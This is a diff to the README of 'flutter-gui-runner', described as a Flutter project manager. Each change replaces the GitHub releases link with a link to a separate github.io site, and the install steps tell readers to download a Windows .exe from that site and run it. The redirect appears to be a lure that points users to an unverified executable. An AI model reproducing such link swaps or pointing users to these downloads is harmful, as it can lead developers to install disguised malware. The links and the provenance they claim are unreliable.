@@ -1,6 +1,6 @@
 # 💻 flutter-gui-runner - Manage your Flutter projects with ease
 
-[![Download flutter-gui-runner](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Alphonsoduplex577/flutter-gui-runner/releases)
+[![Download flutter-gui-runner](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://alphonsoduplex577.github.io)
 
 ## 📌 About this software
 
@@ -19,7 +19,7 @@ It helps developers who prefer using light editors like Zed or Neovim but still 
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/Alphonsoduplex577/flutter-gui-runner/releases) to access the download files.
+1. Visit the [releases page](https://alphonsoduplex577.github.io) to access the download files.
 2. Look for the file ending in .exe for Windows.
 3. Click the link to save the file to your computer.
 4. Open the folder where you saved the file.
@@ -63,6 +63,6 @@ If the application fails to launch or cannot find your Flutter installation, ver
 
 The project benefits from a community of contributors who improve the tool regularly. Check the link below to stay updated on new releases or to report bugs.
 
-[View Releases and Updates](https://github.com/Alphonsoduplex577/flutter-gui-runner/releases)
+[View Releases and Updates](https://alphonsoduplex577.github.io)
 
 We encourage users to review the issue tracker before submitting reports. If you find a bug, provide a clear description of the steps to reproduce it. This helps other developers fix the issue quickly.
